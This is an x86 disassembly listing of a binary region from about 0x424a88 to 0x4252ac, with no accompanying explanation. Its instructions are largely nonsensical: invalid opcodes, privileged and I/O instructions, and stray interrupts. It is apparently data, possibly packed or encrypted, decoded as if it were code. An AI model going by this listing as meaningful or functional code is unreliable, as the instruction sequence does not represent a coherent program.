  424a88:	std    
  424a89:	cmp    edi,DWORD PTR [ecx+0x4]
  424a8c:	add    bh,bh
  424a8e:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424a94:	push   ebx
  424a95:	ror    DWORD PTR [edx],cl
  424a97:	jbe    0x424a56
  424a99:	pop    ebp
  424a9a:	push   0xcf35869f
  424a9f:	jl     0x424a4e
  424aa1:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424aa7:	leave  
  424aa8:	jbe    0x424aef
  424aaa:	sbb    BYTE PTR [edi+0x76c93586],bl
  424ab0:	shr    al,1
  424ab2:	lahf   
  424ab3:	xchg   BYTE PTR ds:0xc955760a,dh
  424ab9:	jbe    0x424b28
  424abb:	dec    ecx
  424abc:	and    DWORD PTR [esi-0x3234c4cb],eax
  424ac2:	xchg   esp,eax
  424ac3:	iret   
  424ac4:	inc    ebp
  424ac5:	shl    ebx,cl
  424ac7:	xchg   edx,eax
  424ac8:	adc    bh,bl
  424aca:	scas   eax,DWORD PTR es:[edi]
  424acb:	cmp    DWORD PTR [eax+0x150ab880],eax
  424ad1:	lea    esi,[eax+eax*1+0x0]
  424ad5:	add    BYTE PTR [esi+0x4],ch
  424ad8:	cli    
  424ad9:	xchg   BYTE PTR [edx-0x6047a019],al
  424adf:	xchg   BYTE PTR ds:0x94060a,dh
  424ae5:	add    BYTE PTR [eax],al
  424ae7:	or     al,BYTE PTR [esi]
  424ae9:	mov    esp,0xa000000
  424aee:	jbe    0x424aa0
  424af0:	or     dh,BYTE PTR [esi+0x15]
  424af3:	iret   
  424af4:	outs   dx,BYTE PTR ds:[esi]
  424af5:	std    
  424af6:	iret   
  424af7:	jno    0x424b69
  424af9:	or     dh,BYTE PTR [esi+0x2d]
  424afc:	or     dh,BYTE PTR [esi+0x35]
  424aff:	leave  
  424b00:	push   es
  424b01:	jo     0x424b03
  424b03:	add    BYTE PTR [eax],al
  424b05:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424b0b:	pushf  
  424b0c:	add    BYTE PTR [eax],al
  424b0e:	add    BYTE PTR [edx],cl
  424b10:	pop    ss
  424b11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b12:	add    BYTE PTR [eax],al
  424b14:	add    cl,cl
  424b16:	push   es
  424b17:	lods   al,BYTE PTR ds:[esi]
  424b18:	add    BYTE PTR [eax],al
  424b1a:	add    BYTE PTR [edx-0x61],cl
  424b1d:	xchg   BYTE PTR ds:0xb406c9,dh
  424b23:	add    BYTE PTR [eax],al
  424b25:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b2b:	les    eax,FWORD PTR [eax]
  424b2d:	add    BYTE PTR [eax],al
  424b2f:	popa   
  424b30:	lahf   
  424b31:	xchg   BYTE PTR ds:0x9006c9,dh
  424b37:	add    BYTE PTR [eax],al
  424b39:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b3f:	aam    0x0
  424b41:	add    BYTE PTR [eax],al
  424b43:	call   0xa77d1e7
  424b48:	iret   
  424b49:	fadd   QWORD PTR [eax]
  424b4b:	add    BYTE PTR [eax],al
  424b4d:	leave  
  424b4e:	push   es
  424b4f:	in     al,0x0
  424b51:	add    BYTE PTR [eax],al
  424b53:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424b59:	add    ecx,ecx
  424b5b:	jbe    0x424b62
  424b5d:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424b63:	or     ecx,ecx
  424b65:	jbe    0x424b33
  424b67:	inc    ecx
  424b68:	lahf   
  424b69:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424b6f:	jbe    0x424b96
  424b71:	pusha  
  424b72:	lahf   
  424b73:	xchg   BYTE PTR ds:0x493d76c9,dh
  424b79:	and    DWORD PTR [esi-0x3292c4cb],eax
  424b7f:	int3   
  424b80:	push   es
  424b81:	jo     0x424b83
  424b83:	add    BYTE PTR [eax],al
  424b85:	shr    ebx,cl
  424b87:	xchg   edx,eax
  424b88:	add    DWORD PTR [edx],eax
  424b8a:	scas   eax,DWORD PTR es:[edi]
  424b8b:	or     esp,ecx
  424b8d:	test   DWORD PTR [eax+eax*1+0x0],eax
  424b91:	add    BYTE PTR [esp+eax*1-0x7],ch
  424b95:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424b9b:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424ba5:	add    BYTE PTR [eax-0x7c],dh
  424ba8:	int    0xb3
  424baa:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424bb0:	inc    esp
  424bb1:	add    BYTE PTR [eax],al
  424bb3:	add    BYTE PTR [edx+0x70],ah
  424bb6:	add    BYTE PTR [ecx-0x78],dh
  424bb9:	or     dh,BYTE PTR [esi+0x7d]
  424bbc:	iret   
  424bbd:	jbe    0x424b7c
  424bbf:	jo     0x424b8e
  424bc1:	or     BYTE PTR ds:0x808081,ah
  424bc7:	push   eax
  424bc8:	int    0x76
  424bca:	jge    0x424bcc
  424bcc:	icebp  
  424bcd:	int    0x76
  424bcf:	std    
  424bd0:	int    0x8d
  424bd2:	std    
  424bd3:	cmp    edi,DWORD PTR [ecx+0x4]
  424bd6:	add    bh,bh
  424bd8:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424bde:	push   ebx
  424bdf:	ror    DWORD PTR [edx],cl
  424be1:	jbe    0x424bf0
  424be3:	int    0x8d
  424be5:	std    
  424be6:	int    0x76
  424be8:	std    
  424be9:	cmp    ecx,DWORD PTR [edi]
  424beb:	add    al,0x11
  424bed:	call   ebx
  424bef:	lods   eax,DWORD PTR ds:[esi]
  424bf0:	sub    bl,dl
  424bf2:	jmp    0x424b86
  424bf4:	push   ebx
  424bf5:	jge    0x424bc4
  424bf7:	jbe    0x424bb6
  424bf9:	inc    ebx
  424bfa:	rcl    esp,cl
  424bfc:	xchg   esi,eax
  424bfd:	or     dh,BYTE PTR [esi+0x75]
  424c00:	in     al,dx
  424c01:	das    
  424c02:	int    0x80
  424c04:	int    0x8d
  424c06:	jne    0x424c12
  424c08:	jbe    0x424bc7
  424c0a:	int    0x76
  424c0c:	mov    ebp,0x4dd4d343
  424c11:	int    0x70
  424c13:	sbb    al,0xcd
  424c15:	mov    bl,0x25
  424c17:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424c21:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424c2b:	int    0xb3
  424c2d:	sub    eax,0xcd808081
  424c32:	xchg   esi,eax
  424c33:	dec    esp
  424c34:	int    0x62
  424c36:	cmp    al,0x87
  424c38:	xor    DWORD PTR [edx],ecx
  424c3a:	jo     0x424c60
  424c3c:	int    0x76
  424c3e:	stc    
  424c3f:	int    0x8d
  424c41:	stc    
  424c42:	cmp    edi,DWORD PTR [ecx+0x4]
  424c45:	add    bh,bh
  424c47:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c4d:	push   ebx
  424c4e:	ror    DWORD PTR [edx],cl
  424c50:	jbe    0x424c5f
  424c52:	int    0x96
  424c54:	and    al,0x9a
  424c56:	pop    ebx
  424c57:	mov    ebp,0xf5e2
  424c5c:	push   es
  424c5d:	ins    DWORD PTR es:[edi],dx
  424c5e:	das    
  424c5f:	add    eax,0x80808099
  424c64:	add    dh,dl
  424c66:	and    al,0xcd
  424c68:	lock pop ebx
  424c6a:	mov    ebp,0xf52c
  424c6f:	push   es
  424c70:	ins    DWORD PTR es:[edi],dx
  424c71:	das    
  424c72:	add    eax,0x808080c5
  424c77:	int    0x76
  424c79:	and    al,0xcd
  424c7b:	lock int 0xd5
  424c7e:	mov    ebp,0xfbe7
  424c83:	push   es
  424c84:	ins    DWORD PTR es:[edi],dx
  424c85:	das    
  424c86:	add    eax,0x808080d1
  424c8b:	call   0x0:0xf90ebd5b
  424c92:	push   es
  424c93:	ins    DWORD PTR es:[edi],dx
  424c94:	das    
  424c95:	add    eax,0x8080802d
  424c9a:	int    0x8
  424c9c:	and    eax,0x43808081
  424ca1:	sbb    al,0xd6
  424ca3:	sbb    cl,ch
  424ca5:	or     BYTE PTR [ecx],dl
  424ca7:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424cb1:	int    0x8d
  424cb3:	dec    esp
  424cb4:	add    BYTE PTR [ecx+0x70005b94],dl
  424cba:	and    al,0xcd
  424cbc:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424cc2:	or     ch,0x7d
  424cc5:	cmp    ecx,DWORD PTR [edi]
  424cc7:	add    al,0x11
  424cc9:	call   ebx
  424ccb:	jmp    0x424c5f
  424ccd:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424cd3:	(bad)
  424cd7:	dec    ecx
  424cd8:	and    BYTE PTR [esi-0x778932cb],al
  424cde:	int    0x8d
  424ce0:	mov    ch,cl
  424ce2:	jbe    0x424d08
  424ce4:	shr    ebx,cl
  424ce6:	xchg   edx,eax
  424ce7:	adc    al,BYTE PTR [edx]
  424ce9:	scas   eax,DWORD PTR es:[edi]
  424cea:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424cf0:	sbb    ch,cl
  424cf2:	ins    BYTE PTR es:[edi],dx
  424cf3:	cmp    al,0xcd
  424cf5:	lea    ebp,[edi+eax*4]
  424cf8:	lds    ecx,FWORD PTR [edx]
  424cfa:	outs   dx,BYTE PTR ds:[esi]
  424cfb:	adc    al,0xcd
  424cfd:	jbe    0x424d2b
  424cff:	leave  
  424d00:	add    BYTE PTR [edi-0x327f7f80],0x76
  424d07:	sub    al,0xa
  424d09:	pushf  
  424d0a:	test   ch,cl
  424d0c:	jbe    0x424d3e
  424d0e:	int    0x8d
  424d10:	sub    al,0xa
  424d12:	outs   dx,BYTE PTR ds:[esi]
  424d13:	mov    ch,cl
  424d15:	jbe    0x424d2b
  424d17:	int    0x8d
  424d19:	sub    al,0xa
  424d1b:	outs   dx,BYTE PTR ds:[esi]
  424d1c:	dec    esp
  424d1d:	in     al,dx
  424d1e:	adc    al,0xcd
  424d20:	jbe    0x424d46
  424d22:	int    0x6c
  424d24:	cmp    al,0xcd
  424d26:	lea    ebp,[edi+eax*4]
  424d29:	lds    ecx,FWORD PTR [edx]
  424d2b:	outs   dx,BYTE PTR ds:[esi]
  424d2c:	adc    al,0xcd
  424d2e:	jbe    0x424d5c
  424d30:	add    al,0x2c
  424d32:	or     cl,0x76
  424d35:	icebp  
  424d36:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424d40:	cmp    ebx,ebp
  424d42:	int    0xc5
  424d44:	arpl   sp,bp
  424d46:	xchg   edx,eax
  424d47:	cmp    ebp,DWORD PTR [ebp-0x56]
  424d4a:	test   al,0xcb
  424d4c:	shl    BYTE PTR [eax+eax*4],cl
  424d4f:	xchg   esi,eax
  424d50:	int    0xed
  424d52:	jno    0x424dc5
  424d54:	das    
  424d55:	mov    ebx,0x74cf146e
  424d5a:	mov    BYTE PTR [edi+ebp*1],bl
  424d5d:	mov    ebx,0x9a5b867e
  424d62:	leave  
  424d63:	jbe    0x424d62
  424d65:	dec    ecx
  424d66:	and    DWORD PTR [esi-0x672f5cb],eax
  424d6c:	push   es
  424d6d:	retf   
  424d6e:	aam    0xb4
  424d70:	popa   
  424d71:	shl    DWORD PTR [ecx],1
  424d73:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424d79:	out    0x88,al
  424d7b:	xchg   edx,edi
  424d7d:	pop    esi
  424d7e:	out    0x4c,al
  424d80:	or     BYTE PTR [ebp-0x33],0xdc
  424d84:	mov    BYTE PTR [edi-0x77197806],al
  424d8a:	pop    esi
  424d8b:	out    0x4c,al
  424d8d:	cmp    BYTE PTR [edx-0x33],0x8d
  424d91:	std    
  424d92:	int    0xe6
  424d94:	std    
  424d95:	cmp    edx,DWORD PTR [ebx]
  424d97:	add    al,0xf8
  424d99:	call   ebx
  424d9b:	jmp    0xd41e1ac8
  424da0:	in     al,dx
  424da1:	xchg   edx,eax
  424da2:	push   ebx
  424da3:	cld    
  424da4:	add    al,0xf2
  424da6:	std    
  424da7:	add    al,0xd3
  424da9:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424db0:	sub    BYTE PTR [ebx-0x6],dl
  424db3:	adc    bh,al
  424db5:	dec    ecx
  424db6:	and    DWORD PTR [esi-0x2197ecb],eax
  424dbc:	int    0x8d
  424dbe:	std    
  424dbf:	int    0xe6
  424dc1:	std    
  424dc2:	cmp    edx,DWORD PTR [ebx]
  424dc4:	add    al,0xf8
  424dc6:	call   ebx
  424dc8:	jmp    0x424d5c
  424dca:	shr    ecx,cl
  424dcc:	sub    BYTE PTR [ebx-0x10],dl
  424dcf:	inc    ebx
  424dd0:	(bad)  
  424dd1:	stc    
  424dd2:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424dd9:	ror    BYTE PTR [eax-0x12326980],cl
  424ddf:	add    al,0xed
  424de1:	push   eax
  424de2:	leave  
  424de3:	jbe    0x424d8a
  424de5:	mov    edx,0xc98080ac
  424dea:	jbe    0x424da1
  424dec:	xchg   eax,ecx
  424dee:	add    BYTE PTR [eax-0x68528937],0x40
  424df5:	add    BYTE PTR [eax-0x51068937],0x30
  424dfc:	test   BYTE PTR [eax-0x4a028937],al
  424e02:	lods   al,BYTE PTR ds:[esi]
  424e03:	add    BYTE PTR [eax+0x69f176c9],0x53
  424e0a:	add    BYTE PTR [eax-0x76a8937],0x42
  424e11:	add    BYTE PTR [eax-0x78628937],0x80
  424e18:	add    BYTE PTR [eax-0x2c428937],0xb8
  424e1f:	add    BYTE PTR [eax-0x32128937],0x71
  424e26:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424e2d:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e34:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e3a:	(bad)  
  424e3b:	stc    
  424e3c:	cmp    ebx,edx
  424e3e:	clc    
  424e3f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424e45:	repnz popa 
  424e47:	and    al,BYTE PTR [eax-0x7a34ed80]
  424e4d:	mov    BYTE PTR [eax+0x42021280],0xa4
  424e54:	add    BYTE PTR [eax+0x3cded312],0x80
  424e5b:	or     cl,0x76
  424e5e:	cmc    
  424e5f:	icebp  
  424e60:	lea    eax,[eax-0x2893680]
  424e66:	jnp    0x424e3c
  424e68:	add    BYTE PTR [eax+0x18f976c9],0x30
  424e6f:	add    BYTE PTR [eax-0x32068933],0x96
  424e76:	std    
  424e77:	ss dec eax
  424e79:	pushf  
  424e7a:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424e81:	int    0xe3
  424e83:	push   esi
  424e84:	jp     0x424e85
  424e86:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424e8d:	int    0x76
  424e8f:	std    
  424e90:	xchg   DWORD PTR [esi-0x78],esi
  424e93:	int    0x96
  424e95:	std    
  424e96:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424e9c:	xor    ch,cl
  424e9e:	jbe    0x424eb1
  424ea0:	int    0x96
  424ea2:	in     eax,dx
  424ea3:	sbb    BYTE PTR ss:[edi-0x80],cl
  424ea7:	cmp    BYTE PTR [ebx],0xd2
  424eaa:	int    0x96
  424eac:	mov    ebp,0xe261d253
  424eb1:	fadd   DWORD PTR [eax-0x320ecc80]
  424eb7:	jbe    0x424e6e
  424eb9:	xchg   DWORD PTR [ebx],edx
  424ebb:	popa   
  424ebc:	fist   WORD PTR [eax+eax*4-0x80]
  424ec0:	xor    esi,ecx
  424ec2:	xchg   DWORD PTR [esi-0x5a893253],edx
  424ec8:	int    0xd6
  424eca:	xor    ch,cl
  424ecc:	out    0x9d,al
  424ece:	adc    bh,bl
  424ed0:	mov    DWORD PTR [ecx-0x80],esi
  424ed3:	sub    BYTE PTR [ebx],0xf1
  424ed6:	int    0x76
  424ed8:	xchg   ebp,eax
  424ed9:	adc    bh,bl
  424edb:	mov    dh,0x2c
  424edd:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424ee4:	clc    
  424ee5:	int    0x96
  424ee7:	icebp  
  424ee8:	push   esi
  424ee9:	out    0x1e,al
  424eeb:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424ef2:	icebp  
  424ef3:	adc    dh,bl
  424ef5:	pop    es
  424ef6:	push   edx
  424ef7:	add    BYTE PTR [eax+0x72f9943],0x63
  424efe:	add    BYTE PTR [eax],al
  424f00:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424f06:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424f0d:	pop    ebx
  424f0e:	cwde   
  424f0f:	call   0x8043:0xd9ed76c9
  424f16:	or     cl,0x76
  424f19:	adc    DWORD PTR [edx+0x7e],esi
  424f1c:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424f23:	add    BYTE PTR [eax+0xbf976c9],0x71
  424f2a:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f31:	add    BYTE PTR [eax-0x275a8937],0x58
  424f38:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f3f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424f46:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424f4d:	add    BYTE PTR [eax-0x449a8937],0x6f
  424f54:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424f5b:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424f62:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424f69:	add    BYTE PTR [eax-0x44f28937],0x4d
  424f70:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424f77:	add    BYTE PTR [eax-0x32528933],0x8d
  424f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f7f:	dec    ebp
  424f80:	bound  ebp,QWORD PTR [ebx]
  424f82:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424f89:	dec    ebp
  424f8a:	pop    ds
  424f8b:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424f91:	pop    edi
  424f92:	xchg   ecx,eax
  424f93:	mov    bh,0x7e
  424f95:	stc    
  424f96:	xor    edi,DWORD PTR [ebp-0x33]
  424f99:	jbe    0x424f98
  424f9b:	int    0x96
  424f9d:	stc    
  424f9e:	sub    edx,edx
  424fa0:	int    0x96
  424fa2:	cmc    
  424fa3:	dec    ebp
  424fa4:	inc    edi
  424fa5:	outs   dx,DWORD PTR ds:[esi]
  424fa6:	add    BYTE PTR [eax-0x69322dcd],0x11
  424fad:	xor    edx,edx
  424faf:	int    0x96
  424fb1:	in     eax,dx
  424fb2:	push   ebx
  424fb3:	sar    BYTE PTR [ebx],cl
  424fb5:	fisubr DWORD PTR [ecx-0x27]
  424fb8:	ret    
  424fb9:	add    BYTE PTR [eax],al
  424fbb:	clc    
  424fbc:	test   ebp,0x72c34c96
  424fc2:	push   ds
  424fc3:	add    BYTE PTR [eax+0x76cdf133],0xbd
  424fca:	int    0xd6
  424fcc:	mov    ch,0x33
  424fce:	leave  
  424fcf:	das    
  424fd0:	sar    DWORD PTR [ecx+0x69],1
  424fd3:	fisttp DWORD PTR [edx]
  424fd5:	xchg   ecx,eax
  424fd6:	mov    ebx,ebp
  424fd8:	popa   
  424fd9:	add    BYTE PTR [eax-0x6a893680],0x9b
  424fe0:	push   esp
  424fe1:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  424fe8:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  424fef:	add    BYTE PTR [eax-0x7e5a8937],0x80
  424ff6:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  424ffd:	pop    ebp
  424ffe:	call   0xcdf4:0xf880806f
  425005:	xchg   esi,eax
  425006:	lods   eax,DWORD PTR ds:[esi]
  425007:	int    0xa6
  425009:	mov    BYTE PTR [ebx-0x2e],dl
  42500c:	int    0x96
  42500e:	popf   
  42500f:	xor    edx,edx
  425011:	int    0x96
  425013:	xchg   ebp,eax
  425014:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425016:	push   eax
  425017:	add    BYTE PTR [eax-0x302d2ed1],0x5
  42501e:	mov    BYTE PTR [eax+0x2c],bl
  425021:	ret    0xafd
  425024:	jbe    0x424fbb
  425026:	int    0x76
  425028:	icebp  
  425029:	int    0x96
  42502b:	or     eax,0xf3f7f534
  425030:	int    0x96
  425032:	xchg   ebp,eax
  425033:	xor    al,0x23
  425035:	inc    esp
  425036:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42503a:	inc    esi
  42503b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  425042:	rol    esi,0x80
  425045:	add    BYTE PTR [edi-0x59328a8a],0x6d
  42504c:	cmp    ebx,edx
  42504e:	clc    
  42504f:	hlt    
  425050:	int    0x96
  425052:	gs mov edi,0xc3d9
  425058:	ss aaa 
  42505a:	push   esi
  42505b:	add    BYTE PTR [eax+0xc56d233],0x6d
  425062:	add    BYTE PTR [eax],al
  425064:	xchg   DWORD PTR [ebp-0x33],edi
  425067:	jbe    0x425066
  425069:	int    0x96
  42506b:	stc    
  42506c:	sub    edx,edx
  42506e:	int    0x96
  425070:	cmc    
  425071:	dec    ebp
  425072:	inc    edi
  425073:	outs   dx,DWORD PTR ds:[esi]
  425074:	add    BYTE PTR [eax-0x69322dcd],0x11
  42507b:	xor    edx,edx
  42507d:	int    0x96
  42507f:	in     eax,dx
  425080:	push   ebx
  425081:	sar    BYTE PTR [ebx],cl
  425083:	(bad)  
  425085:	hlt    
  425086:	int    0x96
  425088:	dec    esp
  425089:	xor    esi,ecx
  42508b:	int    0x76
  42508d:	mov    ebp,0x33b5a6cd
  425092:	leave  
  425093:	das    
  425094:	rol    ebp,1
  425096:	int    0xdb
  425098:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  42509e:	das    
  42509f:	pop    es
  4250a0:	pop    esp
  4250a1:	add    BYTE PTR [eax],al
  4250a3:	add    BYTE PTR [edx-0x2d349c58],ch
  4250a9:	mov    BYTE PTR [eax+0x4edcd96],al
  4250af:	in     eax,dx
  4250b0:	jo     0x42507b
  4250b2:	jbe    0x425084
  4250b4:	xchg   ecx,eax
  4250b5:	aaa    
  4250b6:	ficom  WORD PTR [ebx]
  4250b8:	pop    ebp
  4250b9:	mov    ebp,0xa25230a
  4250be:	jbe    0x425115
  4250c0:	leave  
  4250c1:	jbe    0x425120
  4250c3:	mov    esi,0xa13de37
  4250c8:	jbe    0x42512f
  4250ca:	leave  
  4250cb:	jbe    0x42513a
  4250cd:	fidiv  WORD PTR [edi]
  4250cf:	ficom  WORD PTR [ebx]
  4250d1:	or     dh,BYTE PTR [esi+0x75]
  4250d4:	pop    ebx
  4250d5:	leave  
  4250d6:	jbe    0x425155
  4250d8:	scas   al,BYTE PTR es:[edi]
  4250d9:	aaa    
  4250da:	ficom  WORD PTR [ebx]
  4250dc:	or     dh,BYTE PTR [esi+0xd]
  4250df:	cwde   
  4250e0:	call   0xde37:0x96f176c9
  4250e7:	adc    ecx,DWORD PTR [edx]
  4250e9:	jbe    0x425080
  4250eb:	cmp    ebx,edx
  4250ed:	cmp    eax,DWORD PTR [eax]
  4250ef:	pop    edi
  4250f0:	dec    ecx
  4250f1:	and    DWORD PTR [esi-0x628936cb],eax
  4250f7:	out    0x37,al
  4250f9:	ficom  WORD PTR [ebx]
  4250fb:	jp     0x425107
  4250fd:	jbe    0x4250a4
  4250ff:	int    0xd3
  425101:	or     dl,BYTE PTR [esi-0x4a19f513]
  425107:	iret   
  425108:	xchg   ecx,eax
  425109:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  425110:	push   ebx
  425111:	ror    bh,cl
  425113:	je     0x4250dc
  425115:	ror    ch,1
  425117:	xor    ch,cl
  425119:	pushf  
  42511a:	test   BYTE PTR [edi],ch
  42511c:	inc    ebp
  42511d:	loop   0x4250b1
  42511f:	shr    esp,cl
  425121:	xchg   edx,eax
  425122:	int    0x1c
  425124:	int    0x6c
  425126:	test   BYTE PTR [ebx],bh
  425128:	ins    DWORD PTR es:[edi],dx
  425129:	adc    bh,bl
  42512b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42512c:	mov    esi,0xf1534229
  425131:	or     dl,BYTE PTR [esi-0x6893207]
  425137:	xchg   DWORD PTR [ebp-0x2d],ebp
  42513a:	in     eax,0x28
  42513c:	inc    ebx
  42513d:	jbe    0x42518b
  42513f:	das    
  425140:	or     BYTE PTR [edi-0x327f7f80],bh
  425146:	jbe    0x425141
  425148:	add    al,0xb6
  42514a:	mov    ebp,0x11e60a80
  42514f:	int    0x76
  425151:	stc    
  425152:	push   es
  425153:	ins    DWORD PTR es:[edi],dx
  425154:	aam    0xb6
  425156:	cmp    ebp,DWORD PTR [ebp+0xa]
  425159:	out    0xf5,al
  42515b:	int    0x96
  42515d:	mov    ebp,0xcf88a6cd
  425162:	fs xor ch,cl
  425165:	xchg   esi,eax
  425166:	mov    BYTE PTR [edi-0x5269f527],al
  42516c:	retf   0x922
  42516f:	xchg   esi,eax
  425170:	add    ch,cl
  425172:	xchg   esi,eax
  425173:	stc    
  425174:	xchg   ecx,ebx
  425176:	retf   0x2014
  425179:	int    0xa6
  42517b:	lods   eax,DWORD PTR ds:[esi]
  42517c:	or     DWORD PTR [ebx],ebx
  42517e:	retf   0x96
  425181:	int    0xa6
  425183:	stc    
  425184:	xchg   ecx,esp
  425186:	int    0xe6
  425188:	mov    BYTE PTR [ecx],cl
  42518a:	adc    al,0x43
  42518c:	int    0x96
  42518e:	cmc    
  42518f:	ins    BYTE PTR es:[edi],dx
  425190:	add    al,0xea
  425192:	std    
  425193:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  425199:	push   ebx
  42519a:	sar    BYTE PTR [ebx],cl
  42519c:	ror    DWORD PTR [edx],cl
  42519e:	jbe    0x425195
  4251a0:	push   ecx
  4251a1:	(bad)  
  4251a2:	cmc    
  4251a3:	int    0x96
  4251a5:	cmc    
  4251a6:	add    al,0x11
  4251a8:	call   ebx
  4251aa:	repz xchg edx,eax
  4251ac:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251b2:	xchg   esi,eax
  4251b3:	stc    
  4251b4:	inc    ebx
  4251b5:	rol    BYTE PTR [edx+0x7a003ba7],cl
  4251bb:	int    0x76
  4251bd:	adc    ebp,ecx
  4251bf:	xchg   esi,eax
  4251c0:	stc    
  4251c1:	int    0xa6
  4251c3:	mov    ebp,0xcffdad04
  4251c8:	test   cl,dh
  4251ca:	int    0x96
  4251cc:	stc    
  4251cd:	iret   
  4251ce:	adc    al,0x5b
  4251d0:	int    0xa6
  4251d2:	dec    esp
  4251d3:	shl    ebx,cl
  4251d5:	sub    BYTE PTR [ebx-0x2e],dl
  4251d8:	cmp    edx,ebx
  4251da:	or     dh,BYTE PTR [esi+0x11]
  4251dd:	push   ecx
  4251de:	(bad)  
  4251df:	adc    ebp,ecx
  4251e1:	xchg   esi,eax
  4251e2:	adc    DWORD PTR [ecx+edx*1],eax
  4251e5:	call   ebx
  4251e7:	repz xchg edx,eax
  4251e9:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251ef:	xchg   esi,eax
  4251f0:	stc    
  4251f1:	xchg   edx,ebx
  4251f3:	xor    esp,edx
  4251f5:	or     dh,BYTE PTR [esi-0x43]
  4251f8:	inc    ebx
  4251f9:	lds    ebp,FWORD PTR [edi]
  4251fb:	pop    es
  4251fc:	outs   dx,DWORD PTR ds:[esi]
  4251fd:	add    BYTE PTR [eax],al
  4251ff:	add    ch,cl
  425201:	jbe    0x4251f0
  425203:	int    0x96
  425205:	mov    ch,0x4
  425207:	jmp    0xd384:0xd2046cfd
  42520e:	mov    ebp,0x3bd25328
  425213:	ror    ebp,cl
  425215:	popf   
  425216:	int    0xf1
  425218:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  42521e:	in     eax,0x28
  425220:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  425226:	or     ah,BYTE PTR [esi-0x12697613]
  42522c:	add    al,0xe6
  42522e:	in     eax,dx
  42522f:	xchg   BYTE PTR [edi],ch
  425231:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425237:	test   al,0x63
  425239:	retf   
  42523a:	ror    BYTE PTR [eax-0x12326980],cl
  425240:	add    al,0xed
  425242:	adc    al,0xcd
  425244:	jbe    0x4251ce
  425246:	leave  
  425247:	jbe    0x42525a
  425249:	dec    ecx
  42524a:	and    DWORD PTR [esi-0x28936cb],eax
  425250:	inc    ecx
  425251:	and    DWORD PTR [esi+0x5b80cd35],eax
  425257:	cwde   
  425258:	or     dh,BYTE PTR [esi-0x7]
  42525b:	leave  
  42525c:	jbe    0x425253
  42525e:	into   
  42525f:	and    DWORD PTR [esi+0x76c99a35],eax
  425265:	in     eax,dx
  425266:	inc    esi
  425267:	sbb    DWORD PTR [ebp-0x22932de],esi
  42526d:	int    0x8d
  42526f:	std    
  425270:	sar    bh,0x5d
  425273:	shl    DWORD PTR [ecx],1
  425275:	xchg   BYTE PTR ds:0xd3f03baa,dh
  42527b:	repnz sub BYTE PTR [ebx],bh
  42527e:	adc    ebx,edx
  425280:	out    dx,eax
  425281:	xchg   edx,eax
  425282:	push   ebx
  425283:	add    cl,ch
  425285:	lea    edx,[ecx]
  425287:	int    0x96
  425289:	adc    DWORD PTR [ebx],edi
  42528b:	jge    0x4252c8
  42528d:	(bad)  
  42528f:	jmp    0x425223
  425291:	shr    edx,cl
  425293:	sub    BYTE PTR [ebx+0x13],dl
  425296:	das    
  425297:	rol    DWORD PTR [edx],1
  425299:	jmp    0x42523a
  42529b:	add    BYTE PTR [eax-0x6723280],0xcd
  4252a2:	xchg   esi,eax
  4252a3:	stc    
  4252a4:	cmp    ebx,ecx
  4252a6:	shr    edx,cl
  4252a8:	sub    BYTE PTR [ebx],bh
  4252aa:	jge    0x42527f
  4252ac:	jmp    0x425240
